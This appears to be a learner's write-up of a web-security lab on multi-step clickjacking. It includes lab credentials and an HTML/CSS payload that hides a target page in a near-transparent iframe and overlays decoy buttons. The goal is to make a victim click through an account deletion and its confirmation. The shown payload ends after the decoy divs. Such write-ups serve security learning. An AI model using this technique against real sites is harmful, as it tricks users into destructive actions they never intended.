## Overview / What I Learned

This lab demonstrated how to exploit multi-step UI interactions via clickjacking.  
It involved tricking a user into clicking two different elements within an iframe:  
1. The "Delete account" button  
2. The confirmation "Yes" button  

The key challenge was to align two decoy buttons on an attacker-controlled page over the iframe-loaded target page to trigger a destructive action.

## Exploit Steps / Methodology

### 1. Recon and Setup

- Logged into the target account using credentials: `wiener:peter`
- Navigated to `/my-account` to locate the "Delete account" and confirmation button
- Noticed the confirmation step made the attack **multi-step**, requiring two clicks

### 2. Crafted the Exploit HTML

Used an iframe to load the vulnerable page and overlaid it with two clickable divs.

Key parts:
- Set iframe to low opacity (`0.0001`) so it remains invisible
- Positioned two divs:
  - First aligns with "Delete account"
  - Second aligns with the "Yes" confirmation

### 3. Final Exploit Payload

```html
<style>
  iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
  }

  .firstClick, .secondClick {
    position: absolute;
    background-color: white;
    padding: 10px;
    cursor: pointer;
    z-index: 1;
  }

  .firstClick {
    top: 330px;
    left: 50px;
  }

  .secondClick {
    top: 285px;
    left: 225px;
  }
</style>

<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
